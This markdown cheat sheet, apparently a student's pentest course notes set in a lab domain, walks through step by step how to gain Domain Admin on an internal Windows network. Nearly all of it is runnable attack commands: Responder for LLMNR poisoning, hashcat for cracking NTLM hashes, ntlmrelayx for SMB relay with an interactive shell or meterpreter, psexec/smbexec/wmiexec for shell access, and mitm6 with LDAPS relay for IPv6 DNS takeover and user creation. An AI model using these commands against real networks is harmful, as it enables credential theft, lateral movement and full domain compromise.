# To get Domain Admins

https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa


## Step by Step to get access to the network

### 1. LLMNR Poisoning
1. sudo responder -I "ur ip" (**start the first thing**) -dwv
2. Use hashcat to crack the ntlm hash
3. **hashcat -a 0 -m 5600 hashed.txt rockyou.txt -o Cracked.txt -O**(do on windows ie gui)

### 2. SMB Relay
1. Check for disabled smb signing or SMB signing enable but not required
2. use nmap --script=smb2-security-mode -p445 192.168.57.0/24 -Pn > tst.txt
3. Do Bash ~/Desktop/tools/pre-exploit/enum/smbtrue.sh tst.txt
4. Save the ips to a txt file. 
5. sudo nano /etc/responder/Responder.conf
6. turn off http and smb
7. sudo responder -I "ur ip" -dwv 
8. ntlmrelayx.py -tf target.txt -smb2support
9. turn on http and smb after closing everything

![image](https://user-images.githubusercontent.com/115465242/196154614-1268aec4-89b3-4bed-b2b2-2bab5857f365.png)

#### This only works if a user is admin on more than one machine. In our case, Fcastle was admin on his machine as well as on Pparker's machine.

#### ADD -i in step 9 to get an interactive smb-shell.(nc 127.0.0.1 11002)
#### -e can be used to execute a program such as meterpreter-shell

### 3. Gaining Shell Access (with Credential)
1. Use msfconsole
2. use windows/smb/psexec
3. set the options
4. run

The above may or may not work try changing target options
if it still doesnt work try the following

1. **psexec.py DOMAINNAME.local/UserName:Password@IP**
2. **smbexec.py DOMAINNAME.local/UserName:Password@IP**
3. **wmiexec.py DOMAINNAME.local/UserName:Password@IP**

### 4. DNS takeover by IPv6

1. sudo mitm6 -d DOMAIN
2. ntlmrelayx.py -6 -t ldaps://DC-IP -wh fakewpad.marvel.local -l lootme
3. cd lootme
4. use firefox filename to see the files
5. if some user joins sometimes the ntlmrelayx will try to create a new user with some higher access
6. https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/ (for better read)

### Passback Attack
1. https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack

## Strategies for attack
1. Start with mitm6 or responder
2. Run scan to generate traffic
3. use http_version to look for websites in scope
4. Look for default credentials on web login 
  i. Printer
  ii. Jenkins
  iii. 
5. Enumerate




